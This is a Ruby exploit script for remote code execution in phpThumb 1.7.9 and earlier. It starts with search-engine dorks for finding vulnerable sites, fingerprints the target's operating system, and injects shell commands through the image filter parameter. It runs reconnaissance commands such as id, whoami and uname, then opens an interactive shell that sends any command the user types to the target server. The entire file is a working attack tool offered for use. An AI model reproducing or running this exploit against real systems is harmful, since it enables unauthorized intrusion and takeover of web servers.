#!/usr/bin/env ruby
#
# phpThumb <= 1.7.9-2008
#  RCE Exploiter v0.1
#      By: Hood3dRob1n
#
# DORK: inurl:phpThumb.php?src=
# DORK: intext:phpThumb() v1.7.9
#

require 'optparse'
require 'net/http'
require 'open-uri'
require 'rubygems'
require 'colorize'

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, exiting program now....".red ; exit 666 }

def cls
	if RUBY_PLATFORM =~ /win32/ 
		system('cls')
	else
		system('clear')
	end
end

@banner = "phpThumb <= 1.7.9"
@banner += "\nRemote Code Execution Exploit"
@banner += "\nBy: MrGreen"

options = {}
optparse = OptionParser.new do |opts| 
	opts.banner = "Usage:".light_blue + "#{$0} ".white + "[".light_blue + "OPTIONS".white + "]".light_blue
	opts.separator ""
	opts.separator "EX:".light_blue + " #{$0} -t site.com -p /includes/phpthumb/phpThumb.php --image /uploads/gallery/large/MG0465.jpg".white
	opts.separator "EX:".light_blue + " #{$0} --target www.site.something.geo --path /tele/phpThumb/phpThumb.php".white
	opts.separator ""
	opts.separator "Options: ".light_blue
	opts.on('-t', '--target <SITE>', "\n\tTarget Domain or IP Running phpThumb <= 1.7.9".white) do |target|
		options[:site] = target.sub('http://', '').sub('https://','').sub(/\/$/, '')
	end
	opts.on('-p', '--path <PATH>', "\n\tPath to phpThumb".white) do |ipath|
		options[:path] = ipath.chomp
	end
	opts.on('-i', '--image <IMAGE>', "\n\tValid Image Found on the Target Site".white) do |zimage|
		options[:image] = zimage.chomp
	end
	opts.on('-h', '--help', "\n\tHelp Menu".white) do 
		cls 
		puts
		puts "#{@banner}".light_blue
		puts
		puts opts
		puts
		exit 69
	end
end

begin
	foo = ARGV[0] || ARGV[0] = "-h"
	optparse.parse!

	mandatory = [:site, :path]
	missing = mandatory.select{ |param| options[param].nil? }
	if not missing.empty?
		puts "Missing options: ".red + " #{missing.join(', ')}".white  
		puts optparse
		exit
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	cls
	puts $!.to_s.red
	puts
	puts optparse
	puts
	exit 666;
end

if options[:image].nil?
	options[:image] = 'foo.jpg'
end

cls 
puts
puts "#{@banner}".light_blue
puts

@confirm = "#{options[:path]}?src=#{options[:image]}"

looper=0
while looper < 1
	begin
		http = Net::HTTP.new("#{options[:site]}", '80')
		request = Net::HTTP::Get.new(@confirm)
		response = http.request(request)
		orez = response['server']

		#Determine OS so we choose proper payloads later and for user edumacation :p
		if not orez.nil?
			if (orez =~ /IIS/ or orez =~ /\(Windows/ or orez =~ /\(Win32/ or orez =~ /\(Win64/)
				os = "Windows: #{orez}"
				@ost = 1
			elsif (orez =~ /Apache\//)
				os = "Unix: #{orez}"
				@ost = 0
			else
				os = orez
				@ost = 0
			end
		end

		if response.body =~ /phpThumb\(\) v(.+)\s+/
			@thumbv=$1 #phpThumb Version Info
		end

		# Check server status on pages requested
		if response.code == "200"
			puts "Site appears to be up".green + ".......".white
			puts "OS: ".light_green + "#{os}".white
			puts "phpThumb() Version: ".light_green + "#{@thumbv}".white if not @thumbv.nil?
			puts
			puts "Checking for vuln now".light_blue + ".........".white
			puts
		else
			puts
			puts "Provided site and path don't seem to be working! Please double check and try again or check manually, sorry".light_red + ".......".white
			puts
			exit 666;
		end


		if @ost.to_i == 1
			@cmd='dir'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg%26%26 echo fooFucker%26%26 #{@cmd}%26%26 echo fooFucked%26%26 &phpThumbDebug=9"
		else
			@cmd='ls -lua'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg; echo fooFucker; #{@cmd}; echo fooFucked; &phpThumbDebug=9"
		end

		http = Net::HTTP.new("#{options[:site]}", '80')
		request = Net::HTTP::Get.new(URI.encode(@confirm))
		response = http.request(request)
		orez = response['server']

		if response.body =~ /fooFucker\s+(.+){1}fooFucked\s+/m
			@cheddir=$1 #Current Directory Listing
			puts "Successful Injection".light_green + "!".white
			puts "Scraping some info and dropping to shell mode".green + "......".white
			puts
		else
			puts
			puts "Injection doesnt seem to be working! Please double check and try again or check manually (sometimes results are stuck in an actual image), sorry".light_red + ".......".white
			puts
			exit 666;
		end

		if @ost.to_i == 1
			@cmd='whoami'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg%26%26 echo fooFucker%26%26 #{@cmd}%26%26 echo fooFucked%26%26 &phpThumbDebug=9"
		else
			@cmd='id'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg; echo fooFucker; #{@cmd}; echo fooFucked; &phpThumbDebug=9"
		end

		http = Net::HTTP.new("#{options[:site]}", '80')
		request = Net::HTTP::Get.new(URI.encode(@confirm))
		response = http.request(request)
		orez = response['server']
		if response.body =~ /fooFucker\s+(.+){1}fooFucked\s+/m
			@id=$1 #Current User ID
		end

		if @ost.to_i == 1
			@cmd='chdir'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg%26%26 echo fooFucker%26%26 #{@cmd}%26%26 echo fooFucked%26%26 &phpThumbDebug=9"
		else
			@cmd='pwd'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg; echo fooFucker; #{@cmd}; echo fooFucked; &phpThumbDebug=9"
		end

		http = Net::HTTP.new("#{options[:site]}", '80')
		request = Net::HTTP::Get.new(URI.encode(@confirm))
		response = http.request(request)
		orez = response['server']
		if response.body =~ /fooFucker\s+(.+){1}fooFucked\s+/m
			@curdir=$1 #Current Directory Path
		end

		if @ost.to_i == 0
			@cmd='uname -a'
			@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg; echo fooFucker; #{@cmd}; echo fooFucked; &phpThumbDebug=9"
		end

		http = Net::HTTP.new("#{options[:site]}", '80')
		request = Net::HTTP::Get.new(URI.encode(@confirm))
		response = http.request(request)
		orez = response['server']
		if response.body =~ /fooFucker\s+(.+){1}fooFucked\s+/m
			@uname=$1 #Linux UNAME build results
		end

		puts "Current User: ".light_blue + "#{@id.sub(/fooFucked\s+(.+)/m,'').chomp}".white if not @id.nil?
		puts "Kernel Info: ".light_blue + "#{@uname.sub(/fooFucked\s+(.+)/m,'').chomp}".white if not @uname.nil?
		puts "Current Location: ".light_blue + "#{@curdir.sub(/fooFucked\s+(.+)/m,'').chomp}".white if not @curdir.nil?
		puts "Directory Listing: ".light_blue + "#{@cheddir.sub(/fooFucked\s+(.+)/m,'').chomp}".white if not @id.nil?
		puts

		# Start Loop to Simulate a Command Shell for user....
		foo=0
		while "#{foo}".to_i < 1
			begin
				print "RCE-Shell> ".light_green
				@cmd = gets.chomp
				puts
				if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
					puts
					puts "OK, exiting RCE Shell session".light_red + "......".white
					puts
					exit 69;
				end

				if @ost.to_i == 1
					@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg%26%26 echo fooFucker%26%26 #{@cmd}%26%26 echo fooFucked%26%26 &phpThumbDebug=9"
				else
					@confirm = "#{options[:path]}?src=#{options[:image]}&w=1024&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg; echo fooFucker; #{@cmd}; echo fooFucked; &phpThumbDebug=9"
				end

				http = Net::HTTP.new("#{options[:site]}", '80')
				request = Net::HTTP::Get.new(URI.encode(@confirm))
				response = http.request(request)
				orez = response['server']
				if response.body =~ /fooFucker\s+(.+){1}fooFucked\s+/m
					@results=$1 #Current Command Results
					puts "#{@results.sub(/fooFucked\s+(.+)/m,'')}".white
				end
			rescue Timeout::Error
				redo
			rescue Errno::ETIMEDOUT
				redo
			end
		end#End of Loop

	rescue OpenURI::HTTPError => e
		puts "Error => #{e}".red
	rescue Errno::EHOSTUNREACH
		puts "\t=> Can't find provided Host! Check domain/IP and try again".red + "......".white
		exit 666;
	rescue EOFError
		puts "\t=> Problem reading Link!".red
		redo
	rescue Timeout::Error
		puts "\t=> #1 Timeout Issues!".red
		redo
	rescue Errno::ETIMEDOUT
		puts "\t=> #2 Timeout Issues!".red
		redo
	end
	break
end
#EOF
